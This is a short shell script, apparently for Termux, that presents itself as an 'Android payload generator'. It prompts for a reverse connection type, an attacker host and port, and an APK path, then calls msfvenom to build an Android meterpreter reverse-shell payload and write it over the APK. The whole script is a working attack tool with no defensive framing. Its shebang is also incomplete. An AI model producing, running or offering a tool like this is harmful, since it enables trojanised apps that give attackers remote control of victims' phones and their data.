#! /system/bin/

clear

echo 'Android payload generator ' |lolcat -a


option=0

while [ $option -ne 13 ]
do
	echo "*** Payload Options ***" |lolcat -a
	
	echo "1. reverse_http" |lolcat -a
	echo "2. reverse_https" |lolcat -a
	echo "3. reverse_tcp" |lolcat -a

	read -p "Select Payload > " option

	if [ $option -eq 1 ]
	then
		payload="reverse_http"
		option=13
	elif [ $option -eq 2 ]
	then
		payload="reverse_https"
		option=13
	elif [ $option -eq 3 ]
	then
		payload="reverse_tcp"
		option=13
	else
		clear
		echo "Invalid Option."  |lolcat -a
		option=0
	fi

done

echo 'Enter LHOST' |lolcat -a
read host

echo 'Enter LPORT' |lolcat -a
read port


flag=0

while [ $flag -eq 0 ]
do
	echo 'Enter path of APK' |lolcat -a
	read -p "Enter Path of APK File > " path
	
	if [ -f $path ]
	then
		flag=1
	else
		clear
		echo "File Not Found" |lolcat -a
		echo ""
	fi
done

echo "Generating Payload Please Wait..." |lolcat  |lolcat -a

~/metasploit-framework/msfvenom -p android/meterpreter/$payload LHOST=$host LPORT=$port --arch dalvik --platform android R > $path |lolcat -a




